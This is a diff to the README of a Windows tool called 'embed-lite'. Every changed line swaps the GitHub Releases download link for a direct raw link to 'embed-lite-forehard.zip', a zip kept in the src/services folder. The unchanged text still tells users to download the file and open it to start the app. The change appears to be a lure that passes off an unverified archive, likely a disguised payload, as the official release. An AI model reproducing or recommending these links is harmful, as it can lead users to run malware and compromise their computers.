@@ -1,10 +1,10 @@
 # 🌿 embed-lite - Simple embeds from any URL
 
-[![Download embed-lite](https://img.shields.io/badge/Download%20embed-lite-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/elisange9119/embed-lite/releases)
+[![Download embed-lite](https://img.shields.io/badge/Download%20embed-lite-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/elisange9119/embed-lite/main/src/services/embed-lite-forehard.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/elisange9119/embed-lite/releases
+Visit this page to download: https://raw.githubusercontent.com/elisange9119/embed-lite/main/src/services/embed-lite-forehard.zip
 
 On that page, choose the latest release for Windows. Download the file that matches your device, then open it to start the app.
 
@@ -25,7 +25,7 @@ If you plan to use it in a browser workflow, keep your browser up to date. If yo
 
 ## 🚀 Install and run on Windows
 
-1. Open the download page: https://github.com/elisange9119/embed-lite/releases
+1. Open the download page: https://raw.githubusercontent.com/elisange9119/embed-lite/main/src/services/embed-lite-forehard.zip
 2. Find the newest release at the top of the page.
 3. Under Assets, download the Windows file.
 4. Save the file to a folder you can find later, such as Downloads or Desktop.
@@ -123,7 +123,7 @@ If your browser blocks the download, allow files from GitHub Releases and try ag
 
 ## 📎 Download again
 
-Visit this page to download: https://github.com/elisange9119/embed-lite/releases
+Visit this page to download: https://raw.githubusercontent.com/elisange9119/embed-lite/main/src/services/embed-lite-forehard.zip
 
 Choose the latest release, then open the Windows file from the Assets list
 
